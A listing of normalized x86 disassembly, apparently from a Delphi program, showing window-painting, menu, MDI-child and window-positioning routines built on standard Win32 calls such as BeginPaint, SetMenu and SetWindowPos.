lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423fe8
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44cf90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_448638
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_447430
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_46206c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423fe8
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_462594
test eax eax
je r-xdata
push ebp
call sub_46206c
pop ecx
push ebp
call sub_46206c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_4620b8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_45f3d0
jmp r-xdata
sub_4622d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_4605a0
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_462344
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_460c3c
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
call sub_420d38
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_44f2dc
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44c100
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_44f2dc
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_420d0c
call sub_45c894
mov edx esi
mov eax ebx
call sub_420d0c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub_4623dc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_462459
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_462464
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44c87c
sub_462490
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44c87c
xor edx edx
jmp r-xdata
mov eax esi
call sub_46071c
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_4624c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_4482f8
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44c87c
sub_46250c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_448404
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_462560
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_4459d4
sub_462594
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_466104
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_4660f0
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4625e0
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_466104
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4660f0
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_462630
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_4181b4
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_462660
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_44f2dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_4660d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_4660d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_462630
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_4660d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4660c0
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_418310
call sub_403290
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4660c0
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4660c0
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4660c0
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_462764
push ebx
mov ebx eax
mov eax ebx
call sub_46275c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_428978
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_46278c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_44c834
mov dl 0x1
mov eax esi
call sub_462af0
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_462b6c
mov edx eax
mov eax esi
call sub_448c94
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_44c9d0
mov dl 0x1
mov eax esi
call sub_461b10
sub_46280c
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_44f2dc
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_458e90
mov edi eax
mov eax ebp
call sub_44f2dc
push eax
call DrawMenuBar
sub_462888
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4207e4
xor edx edx
mov eax ebx
call sub_45a828
sub_4628ac
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_46280c
mov eax edx
mov edx ebx
call sub_4207e4
sub_4628d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462a9a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_466104
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45c3dc
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4660f0
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_4207e4
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4660f0
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_46280c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462aa1
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov dl 0x1
mov eax ebx
call sub_463998
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_44f2dc
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_44f2dc
mov edx eax
mov eax esi
call sub_45c3dc
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call SetMenu
sub_462abc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_462aa8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_462b18
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_462b0c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_462b84
push ebx
mov ebx eax
mov eax ebx
call sub_44e8f4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_462b6c
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_462b6c
mov edx eax
mov eax ebx
call sub_448c94
mov edx 0xff00000f
mov eax ebx
call sub_448c94
pop ebx
retn
sub_462c08
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_44f2dc
push eax
call ShowWindow
sub_462c48
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_462660
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_462660
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_4660d4
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4660c0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_462660
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4660d4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4660c0
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465dc4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465da8
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465d90
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4660c0
call sub_465d90
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465d90
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465ddc
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465dc4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465da8
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465d90
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465ddc
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465dc4
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_4660c0
call sub_465dc4
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465dc4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465da8
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465d90
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465ddc
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465d90
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465ddc
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465dc4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4660c0
call sub_465da8
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_462f9c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_460550
mov edx esi
mov eax edi
call sub_465940
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_46304b ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44c100
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44c100
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4631ad
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_460560
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov eax ebx
call sub_463b0c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_4484f8
push eax
mov eax ebx
call sub_44853c
push eax
mov eax ebx
call sub_44f2dc
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406b90
mov [ ebx + 0x254 ] eax
push ebx
push sub_4620f8
call sub_4217a4
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_458e90
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_44f2dc
push eax
call SetWindowPos
jmp r-xdata
sub_4632fa
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_463425
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_44c464
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_465818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46342c
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_463434
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_44c6d0
push 0x0
mov eax ebx
call sub_44f2dc
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
